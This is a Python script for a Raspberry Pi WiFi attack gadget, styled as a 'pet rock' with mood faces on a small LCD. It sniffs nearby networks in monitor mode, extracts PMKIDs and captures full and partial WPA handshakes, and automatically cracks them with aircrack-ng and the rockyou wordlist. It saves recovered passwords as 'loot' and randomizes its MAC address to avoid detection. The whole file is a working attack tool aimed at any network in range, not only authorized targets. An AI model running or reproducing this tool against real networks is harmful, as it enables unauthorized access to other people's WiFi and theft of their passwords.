#!/usr/bin/env python3
"""
KTOx Payload – Pet Rock WiFi Pro Edition
===================================================
Advanced WiFi reconnaissance with adorable facial expressions.
The rock's mood changes based on WiFi activity - gets excited
when finding handshakes, smug when cracking passwords, frustrated
when scanning with no results.

Controls:
  UP/DOWN    Navigate menu / select adapter
  OK         Start scanning / confirm
  KEY1       Cycle views (face → stats → captures)
  KEY2       Settings menu
  KEY3       Exit

Features:
  • PMKID extraction from M1 messages
  • 4-way handshake capture and detection
  • Half-handshake capture
  • Smart channel hopping (prioritizes client activity)
  • Auto-crack with aircrack-ng + rockyou.txt
  • Manual target selection or continuous auto-attack
  • MAC randomization (stealth mode)
  • Lifetime stats tracking
"""

import os, sys, time, json, signal, threading, subprocess, random, re
from datetime import datetime
from collections import defaultdict, deque
from pathlib import Path

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

try:
    import RPi.GPIO as GPIO
    import LCD_1in44
    from PIL import Image, ImageDraw, ImageFont
    HAS_HW = True
except ImportError:
    HAS_HW = False
    print("Hardware not found")
    sys.exit(1)

try:
    from scapy.all import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, RadioTap, EAPOL, sendp, sniff as scapy_sniff, wrpcap, conf
    SCAPY_OK = True
except Exception as e:
    SCAPY_OK = False
    print(f"Scapy import failed: {e}")

# GPIO & LCD
PINS = {"UP":6, "DOWN":19, "LEFT":5, "RIGHT":26, "OK":13, "KEY1":21, "KEY2":20, "KEY3":16}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
W, H = 128, 128

def font(size=9):
    try:
        return ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", size)
    except:
        return ImageFont.load_default()

f9, f11, f14 = font(9), font(11), font(14)

# Paths
KTOX_DIR = os.environ.get("KTOX_DIR", "/root/KTOx")
LOOT_DIR = Path(KTOX_DIR) / "loot" / "PetRock_WiFi"
LOOT_DIR.mkdir(parents=True, exist_ok=True)
HANDSHAKE_DIR = LOOT_DIR / "handshakes"
CRACKED_DIR = LOOT_DIR / "cracked"
STATS_FILE = LOOT_DIR / "stats.json"
HANDSHAKE_DIR.mkdir(exist_ok=True)
CRACKED_DIR.mkdir(exist_ok=True)

WORDLIST = "/usr/share/wordlists/rockyou.txt"
if not Path(WORDLIST).exists():
    WORDLIST = "/usr/share/john/password.lst"

# Cute faces with moods
FACES = {
    "normal": "(◕‿◕)",
    "blink": "(-‿-)",
    "happy": "(≧◡≦)",
    "excited": "(☼◡☼)",
    "cracked": "(★◡★)",
    "cracking": "(⊙_⊙)",
    "attacking": "(⌐■_■)",
    "deauthing": "(◣_◢)",
    "pmkid": "(ᗒᗨᗕ)",
    "half": "(◕∇◕)",
    "scanning": "(ಠ_↼)",
    "waiting": "(·_·)",
    "stealth": "(#◡#)",
    "lost": "(X∇X)",
}

MOOD_DURATIONS = {
    "happy": 4.0, "excited": 3.0, "cracked": 5.0, "cracking": 0,
    "attacking": 2.5, "deauthing": 2.0, "pmkid": 4.0, "half": 3.0,
    "scanning": 0, "waiting": 0, "lost": 2.0,
}

# Global state
shutdown = threading.Event()
capture_event = threading.Event()
lock = threading.Lock()

mood = "waiting"
mood_timer = None
mon_iface = None
original_mac = None
start_time = time.time()

session_aps = {}
session_clients = {}
session_hs = session_hhs = session_pmkid = session_deauth = 0
lifetime_hs = lifetime_hhs = lifetime_pmkid = cracked_count = 0
captured_bssids = set()
eapol_buffer = defaultdict(list)
beacon_cache = {}

channel_activity = defaultdict(int)
stealth_enabled = False
deauth_enabled = True

def set_mood(new_mood):
    """Set mood with auto-revert timer."""
    global mood, mood_timer
    mood = new_mood
    if mood_timer:
        mood_timer.cancel()
    if dur := MOOD_DURATIONS.get(new_mood):
        mood_timer = threading.Timer(dur, lambda: set_mood("normal"))
        mood_timer.start()

def wait_btn(timeout=0.1):
    start = time.time()
    while time.time() - start < timeout:
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                time.sleep(0.05)
                return name
        time.sleep(0.02)
    return None

def show_message(text, duration=2):
    """Show status message."""
    img = Image.new("RGB", (W, H), "#0A0000")
    d = ImageDraw.Draw(img)
    d.rectangle((0, 0, W, 17), fill=(139, 0, 0))
    d.text((4, 3), "ROCK WiFi PRO", font=f9, fill=(231, 76, 60))
    for i, line in enumerate(text.split('\n')):
        d.text((10, 40 + i*25), line, font=f11, fill=(171, 178, 185))
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(duration)

def load_stats():
    global lifetime_hs, lifetime_hhs, lifetime_pmkid, cracked_count
    if STATS_FILE.exists():
        try:
            data = json.loads(STATS_FILE.read_text())
            lifetime_hs = data.get("hs", 0)
            lifetime_hhs = data.get("hhs", 0)
            lifetime_pmkid = data.get("pmkid", 0)
            cracked_count = data.get("cracked", 0)
        except:
            pass

def save_stats():
    try:
        STATS_FILE.write_text(json.dumps({
            "hs": lifetime_hs, "hhs": lifetime_hhs, "pmkid": lifetime_pmkid,
            "cracked": cracked_count, "last": datetime.now().isoformat()
        }))
    except:
        pass

def get_mac(iface):
    try:
        return Path(f"/sys/class/net/{iface}/address").read_text().strip().upper()
    except:
        return ""

def monitor_up(iface):
    """Enable monitor mode."""
    try:
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True, timeout=5)
        time.sleep(1)
    except:
        pass

    try:
        result = subprocess.run(["sudo", "airmon-ng", "start", iface], capture_output=True, text=True, timeout=10)
        print(f"airmon-ng output: {result.stdout} {result.stderr}")
    except Exception as e:
        print(f"airmon-ng failed: {e}")
        return None

    time.sleep(2)

    # Check various naming patterns
    for candidate in [f"{iface}mon", f"{iface}-mon", f"wlan{iface[-1]}mon", f"wlan{iface[-1]}-mon"]:
        try:
            if subprocess.run(["ip", "link", "show", candidate], capture_output=True, timeout=5).returncode == 0:
                print(f"Monitor interface found: {candidate}")
                return candidate
        except:
            pass

    # Try iw to find monitor interface
    try:
        result = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5)
        for line in result.stdout.split('\n'):
            if 'monitor' in line.lower():
                parts = line.split()
                if parts:
                    return parts[0]
    except:
        pass

    return None

def monitor_down(iface):
    """Disable monitor mode."""
    subprocess.run(["sudo", "airmon-ng", "stop", iface], capture_output=True)

def randomize_mac(iface):
    """Random MAC for stealth."""
    mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"], capture_output=True)
    subprocess.run(["sudo", "ip", "link", "set", iface, "address", mac], capture_output=True)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"], capture_output=True)

def restore_mac(iface, mac):
    if not mac: return
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"], capture_output=True)
    subprocess.run(["sudo", "ip", "link", "set", iface, "address", mac], capture_output=True)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"], capture_output=True)

def set_channel(iface, ch):
    """Change WiFi channel."""
    subprocess.run(["sudo", "iw", "dev", iface, "set", "channel", str(ch)], capture_output=True)

def save_capture(bssid, essid, pkts, ctype):
    """Save packet capture."""
    global lifetime_hs, lifetime_hhs, lifetime_pmkid, session_hs, session_hhs, session_pmkid

    safe = "".join(c if c.isalnum() else "_" for c in essid)[:20]
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = HANDSHAKE_DIR / f"{ctype}_{safe}_{bssid.replace(':', '_')}_{ts}.pcap"

    pkts_to_save = [beacon_cache.get(bssid)] if bssid in beacon_cache else []
    pkts_to_save.extend(pkts)
    wrpcap(str(fname), pkts_to_save)

    # Try to crack
    try_crack(str(fname), essid, bssid)
    return str(fname)

def try_crack(cap_path, essid, bssid):
    """Attempt to crack captured handshake."""
    global cracked_count, lifetime_hs, lifetime_hhs, lifetime_pmkid

    if not Path(WORDLIST).exists():
        return

    set_mood("cracking")
    result = subprocess.run(
        f"aircrack-ng -w {WORDLIST} {cap_path} 2>/dev/null",
        shell=True, capture_output=True, text=True
    )

    if match := re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", result.stdout):
        password = match.group(1)
        safe = "".join(c if c.isalnum() else "_" for c in essid)[:20]
        cracked_file = CRACKED_DIR / f"{safe}_{bssid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        cracked_file.write_text(f"ESSID: {essid}\nBSSID: {bssid}\nPASSWORD: {password}\n")
        cracked_count += 1
        save_stats()
        set_mood("cracked")

packet_count = 0

def packet_handler(pkt):
    """Process captured packets."""
    global session_hs, session_hhs, session_pmkid, captured_bssids, lifetime_hs, lifetime_hhs, lifetime_pmkid, packet_count

    if shutdown.is_set() or not capture_event.is_set():
        return

    if not pkt.haslayer(Dot11):
        return

    packet_count += 1
    if packet_count % 50 == 0:
        print(f"Packets captured: {packet_count}")

    # Beacon: discover APs
    if pkt.haslayer(Dot11Beacon):
        bssid = (pkt[Dot11].addr2 or "").upper()
        if not bssid or bssid == "FF:FF:FF:FF:FF:FF":
            return

        try:
            essid = pkt[Dot11Elt].info.decode("utf-8", errors="replace")
        except:
            essid = "<hidden>"

        sig = getattr(pkt, "dBm_AntSignal", -99)

        with lock:
            beacon_cache[bssid] = pkt
            if bssid not in session_aps:
                session_aps[bssid] = {
                    "essid": essid, "signal": sig, "clients": set(),
                    "last_seen": time.time()
                }
                print(f"New AP: {bssid} ({essid}) Signal: {sig}dBm")
            else:
                session_aps[bssid]["signal"] = sig
                session_aps[bssid]["essid"] = essid

            # Track activity by BSSID (simpler and more reliable)
            channel_activity[bssid] += 1
            set_mood("scanning")

    # Data: find clients
    if hasattr(pkt[Dot11], 'type') and pkt[Dot11].type == 2:
        src = (pkt[Dot11].addr2 or "").upper()
        bss = (pkt[Dot11].addr3 or "").upper()
        if bss in session_aps and src != bss and src != "FF:FF:FF:FF:FF:FF":
            with lock:
                session_aps[bss]["clients"].add(src)
                session_clients[src] = bss

    # EAPOL: handshakes + PMKID
    if pkt.haslayer(EAPOL) and pkt.haslayer(Dot11):
        src = (pkt[Dot11].addr2 or "").upper()
        dst = (pkt[Dot11].addr1 or "").upper()
        pair = tuple(sorted([src, dst]))

        with lock:
            eapol_buffer[pair].append(pkt)

            # Find BSSID
            bssid = None
            for mac in pair:
                if mac in session_aps:
                    bssid = mac
                    break

            if not bssid:
                return

            # PMKID extraction from M1
            if bssid == src and bssid not in captured_bssids:
                try:
                    eapol_raw = bytes(pkt[EAPOL])
                    if len(eapol_raw) > 99:
                        key_info = int.from_bytes(eapol_raw[5:7], "big")
                        is_m1 = (key_info & 0x08) and (key_info & 0x80) and not (key_info & 0x100)

                        if is_m1:
                            try:
                                data_len = int.from_bytes(eapol_raw[97:99], "big")
                                if data_len > 0 and data_len < 1000:
                                    key_data = eapol_raw[99:99+data_len]
                                    # Look for PMKID KDE (0xdd with OUI 0x000fac and type 4)
                                    idx = 0
                                    while idx + 7 < len(key_data):
                                        if key_data[idx] == 0xdd:
                                            kde_len = key_data[idx+1]
                                            if idx + 2 + kde_len <= len(key_data):
                                                oui = key_data[idx+2:idx+5]
                                                kde_type = key_data[idx+5] if idx+5 < len(key_data) else 0
                                                if oui == b'\x00\x0f\xac' and kde_type == 4:
                                                    if idx + 22 <= len(key_data):
                                                        pmkid = key_data[idx+6:idx+22]
                                                        if pmkid != b'\x00'*16 and len(pmkid) == 16:
                                                            captured_bssids.add(bssid)
                                                            session_pmkid += 1
                                                            lifetime_pmkid += 1
                                                            essid = session_aps[bssid]["essid"]
                                                            print(f"PMKID captured for {essid} ({bssid})")
                                                            set_mood("pmkid")
                                                            save_capture(bssid, essid, [pkt], "pmkid")
                                                            break
                                            idx += 2 + kde_len
                                        else:
                                            idx += 1
                            except:
                                pass
                except:
                    pass

            # Full 4-way handshake
            if bssid not in captured_bssids and len(eapol_buffer[pair]) >= 4:
                captured_bssids.add(bssid)
                session_hs += 1
                lifetime_hs += 1
                essid = session_aps[bssid]["essid"]
                print(f"4-Way Handshake captured for {essid} ({bssid})")
                set_mood("happy")
                save_capture(bssid, essid, list(eapol_buffer[pair]), "hs4")
                eapol_buffer[pair] = []

            # Limit buffer
            if len(eapol_buffer[pair]) > 8:
                eapol_buffer[pair] = eapol_buffer[pair][-4:]

def half_hs_checker():
    """Detect half-handshakes (2-3 messages)."""
    global session_hhs, lifetime_hhs

    while not shutdown.is_set():
        if shutdown.wait(timeout=15):
            break

        with lock:
            now = time.time()
            pairs_to_check = list(eapol_buffer.keys())

        for pair in pairs_to_check:
            pkts = eapol_buffer.get(pair, [])
            if 2 <= len(pkts) < 4:
                try:
                    if now - pkts[0].time > 20:
                        eapol_buffer.pop(pair, None)

                        for mac in pair:
                            if mac in session_aps:
                                bssid = mac
                                break
                        else:
                            continue

                        if bssid not in captured_bssids:
                            with lock:
                                captured_bssids.add(bssid)
                                session_hhs += 1
                                lifetime_hhs += 1
                                essid = session_aps[bssid]["essid"]
                                print(f"Half-Handshake captured for {essid} ({bssid})")
                                set_mood("half")
                                save_capture(bssid, essid, pkts, "hs_half")
                except:
                    pass

def channel_hopper():
    """Hop channels, prioritize active ones."""
    channels_24 = [1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13]

    while not shutdown.is_set() and capture_event.is_set():
        # Sort by activity
        active = sorted(channel_activity.items(), key=lambda x: x[1], reverse=True)

        if active:
            ch, _ = active[0]
            if isinstance(ch, str):
                ch = int(ch)
        else:
            ch = random.choice(channels_24)

        try:
            set_channel(mon_iface, ch)
        except:
            pass

        if stealth_enabled and random.random() < 0.1:
            try:
                randomize_mac(mon_iface)
            except:
                pass

        shutdown.wait(timeout=2)

def sniffer_thread():
    """Packet sniffer."""
    if not SCAPY_OK:
        print("Scapy not available")
        return

    if not mon_iface:
        print("No monitor interface")
        return

    try:
        conf.bufsize = 4*1024*1024
    except:
        pass

    try:
        scapy_sniff(
            iface=mon_iface,
            prn=packet_handler,
            stop_filter=lambda _: shutdown.is_set() or not capture_event.is_set(),
            store=0
        )
    except Exception as e:
        print(f"Sniffer error: {e}")

def draw_face():
    """Draw main face view."""
    img = Image.new("RGB", (W, H), "#0A0000")
    d = ImageDraw.Draw(img)

    # Header
    d.rectangle((0, 0, W, 13), fill=(139, 0, 0))
    d.text((3, 2), "ROCK WiFi PRO", font=f9, fill=(231, 76, 60))

    # Status line
    with lock:
        aps = len(session_aps)
        total = session_hs + session_hhs + session_pmkid
    lt_total = lifetime_hs + lifetime_hhs + lifetime_pmkid
    d.text((2, 14), f"AP:{aps} PWND:{total} LT:{lt_total}", font=f9, fill=(171, 178, 185))

    # Big face
    face = FACES.get(mood, FACES["normal"])
    face_col = "#00FF00" if capture_event.is_set() else "#666666"
    try:
        big_font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 28)
    except:
        big_font = f14

    bbox = d.textbbox((0, 0), face, font=big_font)
    fw, fh = bbox[2] - bbox[0], bbox[3] - bbox[1]
    fx = (W - fw) // 2
    fy = 40
    d.text((fx, fy), face, font=big_font, fill=face_col)

    # Bottom
    uptime = int(time.time() - start_time)
    d.text((2, H-28), f"HS:{session_hs} HHS:{session_hhs} PMKID:{session_pmkid}", font=f9, fill=(113, 125, 126))
    d.text((2, H-16), f"{uptime//60:02d}:{uptime%60:02d} | {'STEALTH' if stealth_enabled else 'NORMAL'}", font=f9, fill=(113, 125, 126))
    d.text((2, H-8), "K1=View K2=Menu K3=Exit", font=f9, fill=(192, 57, 43))

    LCD.LCD_ShowImage(img, 0, 0)

def draw_stats():
    """Draw stats view."""
    img = Image.new("RGB", (W, H), "#0A0000")
    d = ImageDraw.Draw(img)
    d.rectangle((0, 0, W, 17), fill=(139, 0, 0))
    d.text((4, 3), "SESSION", font=f9, fill=(231, 76, 60))

    y = 20
    with lock:
        d.text((4, y), f"Full HS: {session_hs}", font=f9, fill=(171, 178, 185)); y += 12
        d.text((4, y), f"Half HS: {session_hhs}", font=f9, fill=(171, 178, 185)); y += 12
        d.text((4, y), f"PMKID: {session_pmkid}", font=f9, fill=(171, 178, 185)); y += 12
        d.text((4, y), f"APs: {len(session_aps)}", font=f9, fill=(171, 178, 185)); y += 12

    d.text((4, y+5), "LIFETIME", font=f9, fill=(171, 178, 185)); y += 15
    d.text((4, y), f"HS:{lifetime_hs} HHS:{lifetime_hhs}", font=f9, fill=(113, 125, 126)); y += 12
    d.text((4, y), f"PMKID:{lifetime_pmkid} CRACKED:{cracked_count}", font=f9, fill=(113, 125, 126))
    d.text((4, H-10), "K1=Back K3=Exit", font=f9, fill=(192, 57, 43))

    LCD.LCD_ShowImage(img, 0, 0)

def draw_captures():
    """Draw captures list."""
    img = Image.new("RGB", (W, H), "#0A0000")
    d = ImageDraw.Draw(img)
    d.rectangle((0, 0, W, 17), fill=(139, 0, 0))
    d.text((4, 3), "CAPTURES", font=f9, fill=(231, 76, 60))

    caps = sorted(HANDSHAKE_DIR.glob("*.pcap"), reverse=True)
    if caps:
        y = 20
        for cap in caps[:6]:
            d.text((4, y), cap.name[:20], font=f9, fill=(171, 178, 185))
            y += 12
        d.text((4, H-30), f"{len(caps)} total", font=f9, fill=(171, 178, 185))
    else:
        d.text((4, 40), "No captures yet", font=f9, fill=(113, 125, 126))

    d.text((4, H-10), "K1=Back K3=Exit", font=f9, fill=(192, 57, 43))
    LCD.LCD_ShowImage(img, 0, 0)

def main():
    global mon_iface, original_mac, shutdown, capture_event, stealth_enabled, deauth_enabled
    global session_hs, session_hhs, session_pmkid, lifetime_hs, lifetime_hhs, lifetime_pmkid

    load_stats()
    set_mood("waiting")

    # Select adapter
    adapters = []
    for iface in ["wlan0", "wlan1"]:
        if subprocess.run(["ip", "link", "show", iface], capture_output=True).returncode == 0:
            adapters.append(iface)

    if not adapters:
        show_message("No WiFi\nadapters!", 2)
        return

    if len(adapters) > 1:
        selection = 0
        while True:
            img = Image.new("RGB", (W, H), "#0A0000")
            d = ImageDraw.Draw(img)
            d.rectangle((0, 0, W, 17), fill=(139, 0, 0))
            d.text((4, 3), "SELECT ADAPTER", font=f9, fill=(231, 76, 60))
            for i, adapter in enumerate(adapters):
                col = "#FF3333" if i == selection else "#AAAAAA"
                d.text((20, 40 + i*30), adapter, font=f11, fill=col)
            d.text((4, H-10), "U/D:Nav K1:Start K3:Exit", font=f9, fill=(192, 57, 43))
            LCD.LCD_ShowImage(img, 0, 0)

            btn = wait_btn(0.1)
            if btn == "UP" and selection > 0:
                selection -= 1
            elif btn == "DOWN" and selection < len(adapters) - 1:
                selection += 1
            elif btn == "KEY1":
                adapter = adapters[selection]
                break
            elif btn == "KEY3":
                return
    else:
        adapter = adapters[0]

    show_message(f"Using\n{adapter}", 1)
    show_message("Enabling\nmonitor...", 2)

    original_mac = get_mac(adapter)
    print(f"Original MAC: {original_mac}")
    mon_iface = monitor_up(adapter)
    print(f"Monitor interface: {mon_iface}")

    if not mon_iface:
        show_message("Monitor mode\nfailed!", 2)
        print(f"Failed to get monitor interface for {adapter}")
        return

    show_message("Starting\nscan...", 1)
    print(f"Scapy available: {SCAPY_OK}")
    print(f"Starting capture on {mon_iface}")

    # Setup signal handlers
    def _stop(sig, frame):
        shutdown.set()

    signal.signal(signal.SIGTERM, _stop)
    signal.signal(signal.SIGINT, _stop)

    # Start capture
    capture_event.set()

    # Start threads
    threading.Thread(target=sniffer_thread, daemon=True).start()
    threading.Thread(target=half_hs_checker, daemon=True).start()
    threading.Thread(target=channel_hopper, daemon=True).start()

    view = "face"
    last_draw_time = 0
    try:
        while not shutdown.is_set():
            btn = wait_btn(0.1)

            if btn == "KEY3":
                break
            elif btn == "KEY1":
                view = {"face": "stats", "stats": "captures", "captures": "face"}[view]
            elif btn == "KEY2":
                stealth_enabled = not stealth_enabled
                try:
                    if stealth_enabled:
                        randomize_mac(mon_iface)
                except:
                    pass
            elif btn == "LEFT":
                deauth_enabled = not deauth_enabled

            # Redraw every 0.2 seconds
            if time.time() - last_draw_time > 0.2:
                try:
                    if view == "face":
                        draw_face()
                    elif view == "stats":
                        draw_stats()
                    elif view == "captures":
                        draw_captures()
                    last_draw_time = time.time()
                except Exception as e:
                    print(f"Draw error: {e}")

            time.sleep(0.05)

    finally:
        shutdown.set()
        capture_event.clear()
        if mood_timer:
            mood_timer.cancel()

        save_stats()

        if stealth_enabled and mon_iface and original_mac:
            restore_mac(mon_iface, original_mac)

        if mon_iface:
            monitor_down(mon_iface)

        show_message("Goodbye!", 1)
        LCD.LCD_Clear()
        GPIO.cleanup()

if __name__ == "__main__":
    main()
